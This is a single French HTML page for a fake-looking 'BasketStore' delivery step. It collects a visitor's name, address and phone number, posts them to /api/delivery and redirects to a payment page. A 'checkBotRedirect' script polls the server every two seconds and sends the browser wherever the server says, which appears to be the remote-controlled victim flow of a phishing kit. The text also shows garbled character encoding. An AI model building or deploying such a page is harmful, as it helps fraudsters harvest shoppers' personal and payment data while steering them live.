<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Livraison - BasketStore</title>
<style>
  body{font-family:Arial;text-align:center;padding:40px;}
  input{display:block;margin:10px auto;padding:10px;width:80%;font-size:1em;}
  button{padding:15px 25px;border-radius:10px;font-size:1.1em;cursor:pointer;background:#28a745;color:white;border:none;}
  button:hover{background:#1e7e34;}
</style>
</head>
<body>
  <h1>ðŸ“¦ Informations de livraison</h1>
  <input type="text" id="nom" placeholder="Nom">
  <input type="text" id="prenom" placeholder="PrÃ©nom">
  <input type="text" id="adresse" placeholder="Adresse">
  <input type="text" id="telephone" placeholder="TÃ©lÃ©phone">
  <button id="goPayment">Continuer vers Paiement</button>

  <script>
    document.getElementById('goPayment').addEventListener('click', async ()=>{
      const data = {
        nom: document.getElementById('nom').value,
        prenom: document.getElementById('prenom').value,
        adresse: document.getElementById('adresse').value,
        telephone: document.getElementById('telephone').value
      };
      try{
        await fetch('/api/delivery',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify(data)
        });
      }catch(e){console.error(e);}
      // Redirection frontend vers paiement
      window.location.href = '/payment.html';
    });

    async function checkBotRedirect() {
      try {
        const res = await fetch('/api/status');
        const data = await res.json();
        if(data.redirect && window.location.pathname !== data.redirect){
          window.location.href = data.redirect;
        }else{setTimeout(checkBotRedirect,2000);}
      }catch(e){setTimeout(checkBotRedirect,2000);}
    }
    checkBotRedirect();
  </script>
</body>
</html>
